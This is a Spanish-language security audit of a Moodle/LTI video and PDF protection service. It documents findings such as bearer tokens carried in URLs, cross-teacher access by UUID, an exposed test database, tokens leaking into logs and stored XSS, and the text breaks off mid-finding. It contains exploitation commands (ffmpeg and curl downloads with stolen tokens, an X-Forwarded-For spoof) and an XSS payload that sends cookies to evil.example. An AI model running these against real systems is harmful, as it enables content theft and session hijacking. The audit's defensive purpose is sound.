# Auditoría de seguridad y plan de refuerzo

**Fecha**: 7 de agosto de 2026
**Motivo**: se reportó que copiando la URL del vídeo se accede al contenido
fuera de Moodle.
**Alcance**: todo `src/`, la configuración de `infra/`, los workflows de CI/CD,
las dependencias y el modelo de seguridad documentado en
[`arquitectura.md`](arquitectura.md) y [`decisiones.md`](decisiones.md).

**Método**: lectura completa del código más comprobaciones ejecutadas. Se levantó
el nginx real contra un árbol de medios simulado y se lanzaron unas 35 peticiones
firmadas y sin firmar; se ejecutaron pruebas puntuales sobre el logger, el motor
de plantillas y `npm audit`. Cada hallazgo indica si está **verificado**
(reproducido aquí) o **por código** (leído y razonado). Los comentarios del
código son abundantes y afirman garantías: se ha comprobado cuáles cumple.

---

## 0. Resumen ejecutivo

**El reporte es correcto, y la causa no es un descuido puntual: es el diseño de
sesión.** El token que emite el launch LTI viaja en la URL de la playlist
(`/hls/<id>/index.m3u8?st=…`), dura cuatro horas, no está ligado a ningún
dispositivo ni dirección, no se puede revocar, y `readSessionToken` lo acepta en
**todas** las rutas. Copiar esa URL del menú contextual del reproductor y
pegarla en otra máquina basta. Con ella, un solo comando descarga el vídeo entero
ya descifrado:

```bash
ffmpeg -i "https://tu-dominio/hls/<uuid>/index.m3u8?st=<token>" -c copy robado.mp4
```

La playlist incluye la URI absoluta de la clave AES y las URLs firmadas de todos
los segmentos, así que `ffmpeg` y `yt-dlp` resuelven descarga y descifrado solos.
Para un PDF basta un `curl`.

La auditoría ha encontrado además **dos problemas de igual o mayor gravedad**:

- **Un profesor puede servirse el material de otro profesor.** El launch resuelve
  el UUID **sólo** por `platform_id`, sin mirar el propietario. Basta editar una
  actividad de Moodle y escribir a mano el UUID ajeno en los parámetros
  personalizados. Contradice literalmente el invariante de `CLAUDE.md`:
  «`owner_sub` separa profesores… un UUID ajeno responde 404».
- **El entorno de test publica Postgres en Internet si se sigue su propio
  README.** Una misma variable, `BIND_ADDRESS`, gobierna el puerto del proxy y el
  de la base de datos, y el README indica ponerla a `0.0.0.0` para resolver un
  problema de conectividad del proxy.

### Lo que hay que arreglar antes que nada

| | Hallazgo | Consecuencia |
|---|---|---|
| **[V-01](#v-01)** | El token de sesión viaja en la URL: pase de 4 h transferible | Compartir un enlace es compartir el contenido |
| **[V-02](#v-02)** | Un profesor abre el material de otro escribiendo su UUID | Robo de contenido entre profesores del mismo Moodle |
| **[V-03](#v-03)** | `BIND_ADDRESS` publica Postgres al seguir el README de test | Base de datos de test accesible desde Internet |
| **[V-04](#v-04)** | Los tokens quedan en los logs de la aplicación **y de nginx** | Quien lee logs reproduce sesiones y puede incriminar a un alumno |
| **[V-05](#v-05)** | La detección de rol de profesor acepta URIs que no lo son | Alumno → gestión completa del catálogo |

### Dos acciones inmediatas, antes de tocar código

1. **Comprobar si el túnel del entorno local está levantado.** `infra/local/.env`
   está versionado en el repositorio con
   `PUBLIC_URL=https://epesmadw0156.tail97d662.ts.net`, y
   `infra/local/compose.yml:33-38` trae secretos por defecto públicos
   (`local-inseguro-session-…`, `local-inseguro-medialink-…`). Si esa instancia
   está expuesta con Tailscale Funnel o con el túnel de Cloudflare, cualquiera
   que lea el repositorio puede forjar sesiones, firmar URLs de segmento y
   calcular el patrón forense de cualquier alumno. Ver [V-10](#v-10).
2. **Revisar `BIND_ADDRESS` en el servidor de test.** Si vale `0.0.0.0`, el
   puerto 55432 está abierto. Ver [V-03](#v-03).

### Una advertencia sobre el conjunto

El sistema no promete impedir la copia; promete hacerla **atribuible**. Esa
promesa se apoya en dos piezas: el patrón A/B por alumno y la herramienta que lo
lee. La segunda está marcada como rota en [`tasks/README.md`](tasks/README.md)
(T13, 🔴 «el algoritmo de lectura actual es incorrecto»). Mientras T13 siga así,
**la compensación que justifica no tener DRM no está demostrada**. Por eso T13 se
reabre dentro de este plan.

---

## 1. Lo que está bien, y conviene no tocar

Se abre por aquí a propósito, porque el resto del documento es una lista de
problemas y daría una impresión falsa del estado real. Todo lo siguiente está
verificado leyendo el código o ejecutándolo, no aceptando los comentarios.

**La validación criptográfica del `id_token` es correcta.** Se apoya en
`jose@6.2.8`: `alg: none` es imposible, la confusión HS256-con-clave-pública está
bloqueada explícitamente en la librería, el `alg` se comprueba contra la clave,
sólo se aceptan claves públicas y RSA ≥ 2048 bits.

**El anti-replay no tiene ventana de carrera.** `consumeOidcState` usa un único
`UPDATE … WHERE state=$1 AND consumed_at IS NULL … RETURNING *`, que en Postgres
toma el bloqueo dentro de la propia sentencia. `state` y `nonce` son 256 bits.

**La receta de `secure_link` de nginx está completa y es correcta.** Se probaron
los dos casos que se suelen olvidar: firma incorrecta → 403, firma caducada →
410. Y once variantes más (sin parámetros, `md5` vacío, `expires=0`, firma de la
variante A reutilizada en la B): todas rechazadas. El HMAC de nginx y el de Node
coinciden exactamente, con el secreto al final, que es lo que cierra la extensión
de longitud.

**Nada fuera de los segmentos se sirve como estático.** Probado uno a uno contra
`location /media/ { return 403; }`: `key.bin` incluso con firma válida → 403;
`A/index.m3u8` —la copia de variante pura— → 403; `meta.json`, `poster.jpg`, los
PDF de `documents/` y `.staging/` → 403. Sin `autoindex`. Sin path traversal:
`..%2f`, `../`, `%2e%2e/` y byte nulo, todos rechazados.

**No hay inyección SQL en ninguna parte.** Toda interpolación en SQL sale de mapas
cerrados o de ternarios sobre valores ya validados. El `LIKE` escapa `\ % _`. Los
cursores de paginación se validan antes de tocar la base de datos.

**No hay inyección de comandos.** Único `spawn` con array de argumentos, sin
shell. El nombre de fichero del usuario nunca entra en `argv`: la ruta es
`<UUID>.<extensión saneada>`. La marca usa `drawbox`, no `drawtext`, así que no
hay fuga de filtergraph.

**El aislamiento por propietario en el catálogo es correcto**, y con red de
seguridad en el esquema: claves foráneas compuestas
`(folder_id, platform_id, owner_sub)` hacen imposible mover material a la carpeta
de otro profesor aunque desapareciera la comprobación de aplicación.

**La consola de administración (T19) está bien hecha**: scrypt con
`timingSafeEqual`, cookies `__Host-` con `HttpOnly`/`Secure`/`SameSite=Strict`,
CSRF por método y ruta, comprobación de `Origin`, bloqueo tras 5 intentos, huella
de credencial que invalida sesiones al cambiar la contraseña, y CSP propia con
`frame-ancestors 'none'`.

**El Deep Linking es sólido**: la respuesta va firmada con nuestra clave privada,
el `deep_link_return_url` viaja dentro de un token nuestro y nunca desde el body,
y la propiedad del material seleccionado sí se comprueba.

**No hay secretos reales commiteados**, y la puerta del CI lo verifica sobre los
`.env.sample`. No hay `pull_request_target` en ningún workflow. Postgres no está
publicado en producción. El volumen de medios está montado `:ro` en el proxy.

---

## 2. Qué protege hoy el sistema, de verdad

La tabla de [`arquitectura.md`](arquitectura.md), corregida con lo que hace el
código:

| Capa | Lo que dice la documentación | Lo que hace hoy |
|---|---|---|
| Cifrado AES-128 de los segmentos | Protege de la descarga directa del `.ts` | Correcto, pero la clave la da un token portador de 4 h sin ligadura ([V-15](#v-15)) |
| Token de clave con caducidad | Protege de «compartir un enlace al vídeo» | **No lo protege**: el enlace lleva el token dentro ([V-01](#v-01)) |
| URLs de segmento firmadas | Impide bajarse una variante entera | **Correcto**; la firma no está ligada a nadie y dura 4 h ([V-12](#v-12)) |
| Alcance de sesión por recurso | Impide el acceso lateral con un UUID conocido | Correcto **para alumnos**. Para quien puede editar una actividad, no ([V-02](#v-02)) |
| Aislamiento por propietario | Un profesor no ve la biblioteca de otro | Correcto en el catálogo. **Roto en el launch** ([V-02](#v-02)) |
| Overlay del DNI | Disuade de la grabación de pantalla | Correcto, y se documenta como disuasión. El texto es forjable por el profesor ([V-30](#v-30)) |
| Marca A/B (forense) | Atribuye una filtración | Se genera bien; **leerla está roto** (T13) |
| `view_event` | Da la lista de candidatos | Ciego ante enlaces compartidos ([V-09](#v-09)); la IP registrada es falsificable ([V-13](#v-13)) |

---

## 3. Hallazgos

### Críticos

<a id="v-01"></a>
#### V-01 · El token de sesión viaja en la URL y es un pase completo de cuatro horas

**Verificado** por lectura; reproducible sin herramientas.

**Dónde**
- `src/ui/assets/video-component.js:41` — `const playlistUrl = ${video.playlistUrl}?st=${encodeURIComponent(sessionToken)}`
- `src/session.js:137-142` — `readSessionToken` acepta `?st=` en cualquier ruta
- `src/media/playlist.js:121` — la playlist incrusta además `?kt=` (token de la clave AES)
- `.env.example:118` — `SESSION_TTL_SECONDS=14400`

**Qué pasa.** El token es un portador puro: quien lo tiene es el alumno, venga de
donde venga. Va en la URL de la playlist, así que aparece en el menú contextual
del `<video>`, en la pestaña de red, en el historial y en los logs del proxy.

**Cómo se explota**

1. El alumno abre la actividad en Moodle.
2. Clic derecho sobre el vídeo → *Copiar dirección del vídeo*, o pestaña Red →
   copiar la URL de `index.m3u8`.
3. Desde cualquier máquina, sin Moodle, sin cuenta y sin cookies:
   `ffmpeg -i "<url copiada>" -c copy robado.mp4`.
4. El mismo token abre el PDF de la misma actividad:
   `curl "https://…/documents/<id>/content?st=<token>" -o robado.pdf`.

**Por qué es crítico.** El primer paso —compartir el enlace— no exige
conocimientos, y el receptor tampoco los necesita. La ventana es de cuatro horas,
no hay forma de cortarla y no hay límite de usos simultáneos.

**Matiz.** El vídeo descargado por esta vía **sí lleva el patrón A/B del alumno
que compartió el enlace**, así que la atribución se conservaría… si T13
funcionase. Lo que se pierde es poder impedirlo y poder enterarse.

**La premisa de ADR-003 ya no es cierta.** ADR-003 justifica el token en la URL
diciendo que «`hls.js` no puede añadir cabeceras». `hls.js` 1.6.16 —la versión
instalada— expone `xhrSetup(xhr, url)`, que se invoca en todas las cargas
(manifest, fragmentos y clave) y permite fijar `Authorization`. Verificado en
`node_modules/hls.js/dist/hls.d.ts:2037`. El único caso que sigue necesitando el
token en la URL es el HLS **nativo** de Safari/iOS, y el código actual lo prefiere
cuando existe (`video-component.js:44`) en vez de reservarlo para cuando no hay
alternativa.

---

<a id="v-02"></a>
#### V-02 · Un profesor accede al material de otro escribiendo su UUID en la actividad

**Verificado** por código. Contradice un invariante documentado.

**Dónde**
- `src/lti/routes.js:193-197` — el launch resuelve con `getVideoForPlatform(resource.id, platform.id)`
- `src/services/videos.js:35-38` — `SELECT * FROM video WHERE id = $1 AND platform_id = $2` ← **sin `owner_sub`**
- `src/services/documents.js:18-21` — idéntico
- `src/services/authorization.js:43` — `materialLoader(kind)(materialId, session.platformId)`, también sin propietario

**Qué pasa.** El UUID que Moodle lleva incrustado (`custom.resourceid`) se
resuelve contra la plataforma y nada más. No se guarda ni se comprueba que ese
UUID lo pusiera ahí un Deep Linking que aquel profesor realmente hizo.

**Cómo se explota**

1. El profesor B crea en su propio curso una actividad «Herramienta externa»
   apuntando a MoodleShield.
2. En *Parámetros personalizados* escribe a mano:
   `resourcekind=pdf` y `resourceid=<UUID de un material del profesor A>`.
3. Abre la actividad. El launch encuentra el material —misma plataforma—, emite
   una sesión con `resource = {kind:'pdf', id:<A>}` y sirve el documento entero.
   Con vídeo, igual vía `/hls/<A>/index.m3u8`.

**De dónde salen los UUID ajenos.** No hay que adivinarlos: circulan. Aparecen en
los parámetros de las actividades del profesor A —visibles para cualquier
co-docente del curso—, en los backups `.mbz`, en las plantillas de curso
compartidas, y **en las URLs `/hls/<uuid>/…` que ve cualquier alumno de A en su
propio navegador**. Un alumno de A que pase el UUID a un profesor B cierra el
círculo.

**Quién no puede.** Un alumno solo, no: su `scope.id` viene fijado en el token y
`authorizeResource` compara `scope.id === materialId`. Hace falta capacidad de
editar una actividad LTI.

**Por qué es crítico.** En una academia con varios profesores sobre el mismo
Moodle, el aislamiento entre bibliotecas es una promesa comercial, no un detalle.
Y la documentación afirma que existe.

---

<a id="v-03"></a>
#### V-03 · El entorno de test publica Postgres en Internet si se sigue su propio README

**Verificado** por código y por documentación.

`infra/test/compose.yml:78-79` y `:142-143`:

```yaml
  db:
    ports:
      - "${BIND_ADDRESS:-127.0.0.1}:${DB_PORT_HOST:-55432}:5432"
  proxy:
    ports:
      - "${BIND_ADDRESS:-127.0.0.1}:${HTTP_PORT:-43128}:8080"
```

**La misma variable publica los dos puertos.** Y `infra/test/README.md:49` dice
literalmente:

> «Si tu proxy corre en Docker en el mismo host, pon `BIND_ADDRESS=0.0.0.0` y
> restringe por firewall, o conéctalo a la red del stack.»

**Cómo se explota**

1. El operador sigue el README para resolver la conectividad del proxy y pone
   `BIND_ADDRESS=0.0.0.0`. Publica también `0.0.0.0:55432 → 5432`.
2. El «restringe por firewall» no surte efecto por defecto: Docker inserta sus
   reglas en la cadena `DOCKER` de iptables, **por delante** de las reglas `INPUT`
   que escribe ufw o firewalld. Hace falta tocar `DOCKER-USER` a propósito.
3. `psql -h <host-test> -p 55432 -U moodleshield` con `DB_PASSWORD`. Postgres
   16-alpine trae `scram-sha-256` con `host all all all`: sólo hace falta la
   contraseña, expuesta a fuerza bruta remota sin límite de intentos.
4. La base de datos de test contiene registros de visionado, el `sub` de los
   alumnos y las plataformas LTI registradas.

Y el entorno de test, según `infra/test/README.md:24-25`, «vive en un servidor
público».

**Producción hace lo correcto**: el servicio `db` no tiene `ports:` en absoluto
(`infra/prod/compose.yml:72-91`). El problema es exclusivo de test, y su causa es
una variable compartida sin aviso.

---

### Altos

<a id="v-04"></a>
#### V-04 · Los tokens acaban en los logs en claro; la redacción no los tapa

**Verificado empíricamente** en las dos capas.

**En la aplicación.** `src/logger.js:4-11` redacta `req.query.st`, `req.query.kt`
y `req.query.md5`, pero `pino-http` registra además `req.url`, que en Express es
`req.originalUrl` —la ruta **con el query string completo**—, y ese campo no está
en la lista. Salida real con la configuración del proyecto:

```json
{"req":{"method":"GET",
        "url":"/hls/abc/index.m3u8?st=TOKEN_SUPER_SECRETO_12345&kt=CLAVE_9999",
        "query":{"st":"[oculto]","kt":"[oculto]"}}}
```

El `query` sale tapado y da sensación de seguridad; el `url` sale entero. Como
`autoLogging` sólo excluye `/healthz` y `/readyz`, **cada petición de playlist
escribe un token de sesión válido a nivel `info`**.

**En nginx.** `infra/nginx/templates/default.conf.template:21` usa el formato
`combined`, que registra `$request` con la query string. Salida real del
laboratorio:

```
GET /hls/1111…/index.m3u8?st=TOKEN-DE-SESION-SECRETO HTTP/1.1" 200
GET /hls/1111…/key?kt=TOKEN-DE-CLAVE-AES HTTP/1.1" 200
GET /media/videos/…/A/seg_0001.ts?md5=mZbJ…&expires=1786059266 HTTP/1.1" 200
```

**Impacto.** El acceso a esos logs es barato en este despliegue:
`/var/log/nginx/access.log` es un symlink a stdout en la imagen oficial, así que
acaba en el `json-file` del host —legible por cualquiera del grupo `docker`— y
en el visor de logs de Portainer, que ya es parte de la operativa. Con una sola
línea se obtiene el `st` (playlist de la víctima), el `kt` (clave AES) y los
`md5`/`expires` (segmentos). Ventana: 4 h.

**Agravante forense.** La copia extraída lleva el patrón A/B **de la víctima**.
Quien tenga acceso a los logs puede filtrar un vídeo que la herramienta
atribuirá a un alumno inocente. Ataca directamente el propósito del sistema.

Las sesiones de catálogo no se ven afectadas porque la interfaz usa
`Authorization: Bearer` (`catalog.js:134`). Las de reproducción, sí. T16
menciona esto de pasada como higiene de observabilidad; es un hallazgo de
seguridad.

---

<a id="v-05"></a>
#### V-05 · La detección de rol de profesor acepta URIs que no designan a un profesor

**Verificado** por código. `src/lti/claims.js:32-34`:

```js
export function hasInstructorRole (roles = []) {
  return roles.some((role) => INSTRUCTOR_ROLES.includes(role) ||
    /#(Instructor|Administrator|ContentDeveloper|TeachingAssistant)$/.test(role))
}
```

La lista blanca `INSTRUCTOR_ROLES` (`:24-30`) es correcta. El problema es el
respaldo por expresión regular: acepta **cualquier** cadena terminada en
`#Instructor`, `#Administrator`, `#ContentDeveloper` o `#TeachingAssistant`, sin
mirar el espacio de nombres. Del vocabulario oficial de LTI 1.3 pasan, entre
otras:

- `http://purl.imsglobal.org/vocab/lis/v2/membership/Learner#Instructor` —
  **sub-rol de Learner**.
- `http://purl.imsglobal.org/vocab/lis/v2/institution/person#Instructor` — rol
  **institucional**: «es docente en la institución», no «en este curso». La lista
  blanca incluye a propósito `institution/person#Administrator`, pero
  `institution/person#Instructor` entra por la puerta de atrás.

**Cómo se explota.** El atacante es profesor de *cualquier* curso de la
institución y alumno del curso B. Abre la actividad de MoodleShield del curso B;
la plataforma manda `membership#Learner` + `institution/person#Instructor`;
`isInstructor` queda en `true`. Si la actividad no tiene material asociado,
`src/lti/routes.js:147-158` le entrega directamente una sesión `mode:'manage'`
con el catálogo completo: subir, crear carpetas y colecciones, gestionar
revisiones.

**Alcance real.** Depende de qué roles emita la plataforma. Canvas y varios LMS
emiten roles institucionales; no se ha podido confirmar que Moodle `mod_lti` los
emita, así que en un despliegue sólo-Moodle el riesgo baja a medio. La corrección
es la misma y cuesta una línea. `test/claims.test.js` sólo prueba
`http://example.org/InstructorAssistantThing`, que no termina en `#Instructor`,
así que la suite no lo detecta.

**Aparte**: `TeachingAssistant` está en la regex pero no en la lista blanca. Un
ayudante obtiene privilegios plenos de gestión. Puede ser intencionado, pero no
está documentado.

---

<a id="v-06"></a>
#### V-06 · `POST /lti/platforms` es un *upsert* que sobrescribe el JWKS sin dejar rastro

**Verificado** por código. `src/lti/routes.js:406-425` → `src/services/platforms.js:216-239`:

```sql
ON CONFLICT (issuer, client_id) DO UPDATE SET
  ..., jwks_url = EXCLUDED.jwks_url, enabled = true, updated_at = now()
```

El endpoint se anuncia como «alta de plataformas», pero con el `issuer` y
`client_id` de una plataforma **ya existente**:

1. Reemplaza `jwks_url` por una URL del atacante, **conservando el mismo
   `lti_platform.id`**.
2. A partir de ahí el atacante firma `id_token` con su propia clave y
   `validateLaunch` los acepta: `iss` y `aud` coinciden y la firma valida contra
   *su* JWKS. Controla `sub`, los roles y `custom.resourceid` → sesión válida como
   cualquier alumno o profesor de ese tenant. El aislamiento por `platform_id` no
   protege, porque el `platform.id` no ha cambiado.
3. Fuerza `enabled = true`, deshaciendo una desactivación hecha a conciencia.
4. **No escribe nada en `admin_audit_event`**, al contrario que
   `createPlatform`/`updatePlatform` (`platforms.js:102-108` y `:153-159`). La
   toma de control no deja rastro.

**Y la puerta es débil.** `src/lti/routes.js:409-410` y `:430`:

```js
if (auth !== `Bearer ${config.lti.adminToken}`) return res.sendStatus(401)
```

- Comparación de cadenas **sin tiempo constante**; es la única comparación de
  secreto del proyecto que no usa `timingSafeEqual`.
- **Sin longitud mínima**: `LTI_ADMIN_TOKEN=x` pasa `assertConfigValid`.
- **Sin límite de peticiones**: el `rateLimit` sólo está montado en `adminRouter`;
  `/lti/platforms` cuelga de `ltiRouter`. Fuerza bruta libre, y nginx tampoco pone
  `limit_req` ([V-17](#v-17)).

**Lo que sí está bien**: con `LTI_ADMIN_TOKEN` vacío el endpoint responde 404
antes de comparar nada. Un token vacío no deja entrar.

---

<a id="v-07"></a>
#### V-07 · XSS almacenado a través del título del material

**Verificado empíricamente** en esta auditoría.

**Dónde**
- `src/ui/render.js:33-35` — `html.replaceAll(\`{{${key}}}\`, String(value ?? ''))`, sin escapar
- `src/lti/routes.js:209-211` — `renderPage('processing.html', { TITLE: material.title, … })`
- `src/ui/processing.html:12` — `<h1>{{TITLE}}</h1>`
- `src/app.js:48` — la CSP incluye `script-src 'self' 'unsafe-inline'`

`safeJson()` protege bien el bloque `{{BOOTSTRAP}}` —un alumno con un nombre de
display hostil en Moodle **no** consigue XSS por ahí—, pero la sustitución
genérica de `{{VAR}}` no protege nada. Resultado real con un título hostil:

```html
<h1><script>fetch("https://evil.example/?c="+document.cookie)</script></h1>
```

Y como la CSP permite `'unsafe-inline'`, ese script ejecuta.

**Cómo se explota.** Quien sube material —un profesor, o quien haya escalado por
[V-05](#v-05)— pone el `<script>` en el título. Cualquier alumno que abra la
actividad **mientras el material se está procesando** lo ejecuta, en el mismo
origen que el reproductor y el visor de PDF, con acceso al `sessionToken`
embebido en las demás páginas del origen.

**Fuente secundaria a revisar en el mismo barrido**: `src/media/pdf.js:106-107`
captura `Title` y `Producer` del PDF con `pdfinfo` y los guarda en `meta.json`.
Son metadatos que elige quien sube el fichero y deben tratarse como no confiables
dondequiera que se pinten.

---

<a id="v-08"></a>
#### V-08 · PDF.js con una vulnerabilidad conocida de ejecución de JavaScript

**Verificado** con `npm audit`.

`pdfjs-dist` declarado como `^5.7.284`. Aviso **GHSA-hq66-cqwq-w95j**, severidad
alta: *«Arbitrary JavaScript execution upon opening a malicious PDF»*, rango
afectado `>=5.6.83 <6.2.108`. Corregido en 6.2.108, que es un salto de versión
mayor. Ninguna otra dependencia tiene avisos (express 5.2.1, jose 6.2.8, pg
8.22.0, busboy 1.6.0).

**Mitigaciones ya presentes**, que bajan la explotabilidad práctica pero no
quitan la versión vulnerable del paquete: el PDF se normaliza con Ghostscript
`-dSAFER` en el worker (ADR-014), el visor pasa `isEvalSupported: false` y
`enableXfa: false` (`src/ui/assets/pdf-component.js:73-74`) —justo el paliativo
que documenta el aviso— y la CSP fija `object-src 'none'`.

---

<a id="v-09"></a>
#### V-09 · La deduplicación por `jti` hace al sistema ciego ante un enlace compartido

**Verificado** por código.

**Dónde**
- `migrations/006_content_collections.sql:68` — `CREATE UNIQUE INDEX view_event_session_uq`
- `src/services/videos.js:299` — `ON CONFLICT DO NOTHING`
- `src/routes/hls.js:71` y `src/routes/documents.js:300` — el fallo del registro se traga con `.catch(warn)`

El índice único por recurso + `session_jti` existe por una buena razón: recargar
el player no debe inventar visionados. El efecto colateral es que **todas** las
peticiones que compartan un token producen una única fila. Si un alumno pega su
enlace en un grupo y lo usan quinientas personas desde quinientas direcciones,
`view_event` registra **un** visionado, con la IP del primero.

No se guarda el número de peticiones por token, ni las direcciones distintas que
lo han usado, ni los user-agent. La señal que delataría la filtración se descarta
en el `ON CONFLICT`.

**Agravante.** El registro es «mejor esfuerzo»: si la inserción falla se anota un
warning y **el contenido se sirve igual**. Para un producto cuyo valor es la
atribución, servir sin dejar traza es el peor modo de fallo posible.

---

<a id="v-10"></a>
#### V-10 · El entorno local trae secretos públicos y una URL pública documentada

**Verificado** por código y por documentación.

`infra/local/compose.yml:33-38`:

```yaml
  SESSION_SECRET: ${SESSION_SECRET:-local-inseguro-session-00000000000000000000}
  WATERMARK_SECRET: ${WATERMARK_SECRET:-local-inseguro-watermark-00000000000000000000}
  MEDIA_KEY_SECRET: ${MEDIA_KEY_SECRET:-local-inseguro-mediakey-00000000000000000000}
  MEDIA_LINK_SECRET: ${MEDIA_LINK_SECRET:-local-inseguro-medialink-00000000000000000000}
  LTI_ADMIN_TOKEN: ${LTI_ADMIN_TOKEN:-local-admin}
```

Y `infra/local/.env:15` —fichero **versionado en el repositorio**, pese a que
`.gitignore:3` contiene `*.env`, porque se añadió con `git add -f` y un fichero ya
trackeado sigue siéndolo— fija
`PUBLIC_URL=https://epesmadw0156.tail97d662.ts.net`. Ese hostname es un nodo
Tailscale real, y `docs/https-tunel.md:99-108` documenta exponerlo con
`tailscale funnel --bg 8088`. **Funnel es público en Internet**, no restringido al
tailnet, y el propio documento lo subraya en la línea 110.

**Si esa instancia está levantada con Funnel o con el túnel de Cloudflare**,
cualquiera que lea el repositorio —que se publica en GHCR bajo AGPL— puede:

1. Forjar un token de sesión HMAC válido para cualquier `platform_id`,
   `owner_sub` y recurso, porque `SESSION_SECRET` es conocido. `authorizeResource`
   deja de ser una barrera.
2. Firmar él mismo cualquier URL `/media/…` con el algoritmo de
   `src/media/signing.js`, porque `MEDIA_LINK_SECRET` es conocido. Descarga todos
   los segmentos de la variante A: copia **sin patrón A/B atribuible**.
3. Forjar el `kt` y obtener la clave AES, porque `MEDIA_KEY_SECRET` es conocido.
4. **Calcular el patrón de cualquier `sub`** y fabricar una filtración que apunte
   a quien quiera, porque `WATERMARK_SECRET` es conocido.

El comentario del fichero («ningún secreto real vive aquí») es cierto y a la vez
es exactamente el problema: los secretos son *públicos*, y la topología
documentada les da una URL pública.

**Riesgo latente añadido.** `infra/local/.env:17` tiene
`CLOUDFLARE_TUNNEL_TOKEN=` vacío —se revisó el histórico y **no hay ninguna fuga
real hoy**—, pero el fichero está trackeado, así que un `git commit -a` lo
llevaría al repositorio con el token dentro. Y la puerta de higiene de secretos
del CI no lo detectaría: `.github/workflows/ci.yml:81` sólo recorre
`infra/*/.env.sample`.

---

### Medios

<a id="v-11"></a>
#### V-11 · La aplicación no valida la firma en modo `app`, y en producción monta la ruta igual

**Verificado** por código, con una corrección importante respecto a la primera
impresión.

**Dónde**
- `src/config.js:134` — `delivery: optional('MEDIA_DELIVERY', 'app')` ← valor por defecto
- `.env.example:49` — `MEDIA_DELIVERY=app` ← la plantilla que se copia
- `src/app.js:88` — `if (config.media.delivery === 'app' || !config.isProduction)` monta `mediaRouter` **también en producción**
- `src/routes/hls.js:146-150` — `sendSegment` sólo comprueba la firma `if (config.media.delivery === 'signed')`
- `src/config.js:242-263` — `assertConfigValid()` **no** exige `signed` en producción

**Lo que NO pasa, y conviene decirlo.** Los tres composes fijan
`MEDIA_DELIVERY: signed` **literalmente**, sin `${...}` que se pueda pisar
(`infra/prod/compose.yml:47`, `infra/test/compose.yml:44`,
`infra/local/compose.yml:47`). Y el diseño **falla cerrado**: aunque alguien
pusiera `app` en producción, nginx seguiría exigiendo firma y las URLs sin firmar
que generase la playlist darían 403 — se rompería la reproducción, no se abriría
un agujero. **Los entornos desplegados no son vulnerables hoy.**

**Lo que sí queda mal.** La aplicación no se defiende sola: depende por completo
de que nginx esté delante y de que su `location /media/` case con
`MEDIA_PUBLIC_PREFIX`. Un despliegue sin proxy, un cambio de prefijo, o cualquier
acceso directo al contenedor `app` —que publica su puerto en loopback
(`infra/prod/compose.yml:152-154`)— reabre la ruta sin firma y sin sesión, y
permite bajarse la variante A entera: una copia cuyo patrón A/B es constante y
**no señala a ningún alumno**. Además el valor por defecto es el inseguro, en el
fichero que todo el mundo copia para crear su `.env`.

Es defensa en profundidad, no una brecha abierta. Pero el objetivo del sistema
—que ninguna copia salga sin marca— es demasiado importante para descansar en una
sola capa.

<a id="v-12"></a>
#### V-12 · La firma de los segmentos no está ligada a nadie, y dura cuatro horas

**Verificado** empíricamente: una URL firmada funciona desde cualquier cliente,
sin cabecera alguna.

`src/media/signing.js:21` y `default.conf.template:45` firman exclusivamente
`expires + uri + secret`. No entra el `sub`, ni la sesión, ni la dirección.
`MEDIA_LINK_TTL_SECONDS` son 4 h por defecto, y el `kt` de la clave AES usa el
mismo TTL (`src/session.js:125`). `infra/local/compose.yml` ni lo fija, así que
cae al valor por defecto.

Un alumno que publique su `index.m3u8` en un pastebin da a **cualquiera en
Internet, sin launch LTI, sin sesión y sin cuenta en Moodle**, cuatro horas de
descarga directa. Es coherente con el diseño —la copia sigue siendo atribuible a
quien la publicó— pero conviene tenerlo explícito: la firma no es un control de
acceso por usuario. nginx admite `$remote_addr` dentro de `secure_link_md5`; no se
está usando.

<a id="v-13"></a>
#### V-13 · La IP que se registra como evidencia forense es falsificable

**Verificado** empíricamente contra el proxy real.

`infra/nginx/proxy_headers.conf:3-5`:

```nginx
proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
proxy_set_header X-Forwarded-Proto $http_x_forwarded_proto;
```

`$proxy_add_x_forwarded_for` **añade** al valor que mandó el cliente en vez de
reemplazarlo. Comprobado:

```
curl -H 'X-Forwarded-For: 1.2.3.4'  →  el upstream recibe: 1.2.3.4, 172.25.0.1
```

`src/config.js:94` fija `trustProxy: 'loopback,linklocal,uniquelocal'`, y
`uniquelocal` incluye 10/8, 172.16/12 y 192.168/16. Express recorre la cadena de
derecha a izquierda saltando direcciones confiables, así que **cuando el cliente
real llega desde una dirección privada** —alumno por la VPN de la institución, red
10.x del campus, el propio servidor Moodle— sigue saltando hasta el valor
inyectado. `req.ip` queda bajo control del cliente, y `src/routes/hls.js:68` lo
escribe en `recordView`: en la evidencia.

`X-Forwarded-Proto` se copia tal cual del cliente. Hoy el impacto es bajo porque
no hay ningún uso de `req.protocol` ni `req.hostname` —las URLs se construyen con
`config.publicUrl`—, pero el comentario del fichero afirma que la aplicación la
necesita, lo que invita a usarla en el futuro. Igual con `Host`: `server_name _`
sin `default_server` que rechace hosts desconocidos, así que
`Host: attacker.example.com` llega íntegro al upstream.

<a id="v-14"></a>
#### V-14 · La defensa contra SSRF existe, pero no se aplica donde importa

`src/admin/platform-validator.js:117-224` implementa una protección seria: DNS
previo, bloqueo de rangos privados, loopback, link-local (incluida
`169.254.169.254`), CGNAT y multicast en IPv4 e IPv6 —incluido `::ffff:`
mapeado—, **fijación de la conexión a la IP validada** (anti-rebinding real),
rechazo de redirecciones, tope de 256 KiB y timeout de 8 s.

**Nada de eso se ejecuta en los dos caminos que importan:**

1. **Al guardar.** `createPlatform`, `updatePlatform` y `upsertPlatform`
   (`src/services/platforms.js:90-239`) sólo llaman a `normalizePlatformInput`,
   que valida sintaxis de URL pero no resuelve DNS ni comprueba IPs.
   `testPlatformConnection` sólo corre si el administrador pulsa «Probar
   conexión», y **su resultado no condiciona el guardado**.
2. **En ejecución.** `src/lti/jwks-cache.js:5-16` hace
   `createRemoteJWKSet(new URL(platform.jwks_url))`: `fetch` normal, resolución
   DNS fresca, sin filtrar rangos privados y **sin tope de tamaño** (jose hace
   `await response.json()` sin límite; un JWKS hostil de varios GB agota la
   memoria del proceso).

Es post-autenticación —hace falta la consola o el bearer— pero convierte
«gestionar plataformas LTI» en «leer la red interna y los metadatos de la nube», y
el guard de la consola da falsa sensación de protección.

**Relacionado**: `platform-validator.js:42-46` permite `http:` para `jwksUrl`,
`authLoginUrl` y `authTokenUrl` cuando `NODE_ENV !== 'production'`. Un JWKS por
HTTP en claro es MITM trivial → forja de `id_token`.

<a id="v-15"></a>
#### V-15 · El token de la clave AES es un portador puro de cuatro horas

`src/session.js:129-134`: `verifyKeyToken` comprueba `typ` y que el `videoId`
